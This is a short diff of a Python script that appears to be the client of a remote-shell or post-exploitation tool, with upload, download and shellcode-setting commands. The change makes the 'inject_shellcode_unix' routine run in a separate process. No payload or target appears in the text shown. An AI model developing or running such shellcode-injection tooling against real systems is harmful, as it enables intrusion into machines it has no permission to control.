@@ -35,7 +35,9 @@ from random import randint
 from threading import Thread
 from requests import Session
 from requests.exceptions import *
+from multiprocessing import Process
 warnings.filterwarnings("ignore")
+
 
 special_commands = ["upload", "download", "setshellcode"]
 chg_dir    = re.compile(r'^\s*cd (.*)$')
@@ -333,10 +335,9 @@ try:
                                 )
                         else:
                             if shellcode:
-                                t = Thread(target=inject_shellcode_unix,
+                                t = Process(target=inject_shellcode_unix,
                                     args=(s,)
                                 )
-                                t.daemon = True
                                 t.start()
                                 time.sleep(1)
                             else:
